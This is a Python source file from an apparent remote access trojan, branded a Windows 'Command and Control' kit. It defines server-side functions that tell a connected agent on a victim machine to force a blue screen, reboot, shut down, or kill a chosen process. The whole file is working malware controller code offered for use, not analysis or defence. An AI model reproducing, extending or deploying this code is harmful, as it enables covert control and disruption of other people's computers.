#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.21
# -------------------------------------------------------------
from core.networking.sockets.server_socket import ServerSocket
from core.client_handling.flags import ClientActionFlags
from core.threading.threads import MultiThreading
from core.networking.sockets.receiver_socket import ReceiverSocket

class SystemManager:

    #Function tells agent to blue screen the computer
    def force_blue_screen(self,encryption_key,client):
        ServerSocket().send_data_to_client(client,encryption_key,f'{ClientActionFlags().blue_screen}{ClientActionFlags().seperator} ') #Send blue screen flag to client

    #Function tells agent to reboot the client
    def reboot_client_system(self,encryption_key,client):
        ServerSocket().send_data_to_client(client,encryption_key,f'{ClientActionFlags().reboot_computer}{ClientActionFlags().seperator} ')  #Send reboot flag to client

    #Function tells agent to shutdown the client
    def shutdown_client_system(self,encryption_key,client):
        ServerSocket().send_data_to_client(client,encryption_key,f'{ClientActionFlags().shutdown_computer}{ClientActionFlags().seperator} ')  #Send shutdown flag to client

    #Function will instruct client to kill process by pid
    def kill_client_process(self,pid,encryption_key,client):
        MultiThreading().create_background_thread_arg(ReceiverSocket().recv_taskkill_output,encryption_key) #Create background thread to catch data
        ServerSocket().send_data_to_client(client,encryption_key,f'{ClientActionFlags().kill_process}{ClientActionFlags().seperator}{str(pid)}') #Tell client to send data